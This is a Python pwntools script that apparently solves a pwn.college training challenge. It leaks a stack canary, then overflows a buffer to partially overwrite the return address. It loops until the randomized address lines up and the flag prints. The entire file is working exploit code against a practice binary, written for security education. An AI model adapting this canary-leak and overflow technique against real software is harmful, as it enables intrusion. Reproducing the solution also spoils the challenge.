from pwn import *


while True:
    p = process('/challenge/babymem_level12.1')

    p.recvuntil('Payload size:')
    p.sendline(b'105')

    payload = b'REPEAT' + b'a' * 99

    #p.recvline('Send your payload')
    p.sendline(payload)

    p.recvuntil('You said: ')
    str = p.recvuntil('Backdoor triggered!')
    canary = bytearray()
    canary.append(0)
    for i in range(105,112):
        canary.append(str[i])

    #print(canary)
    #p.recvuntil('Payload size:')
    p.sendline(b'122')
    payload =  b'a' * 104 + canary + b'a' * 8 + p16(0x1ea8)
    p.recvuntil('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    #print(str)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
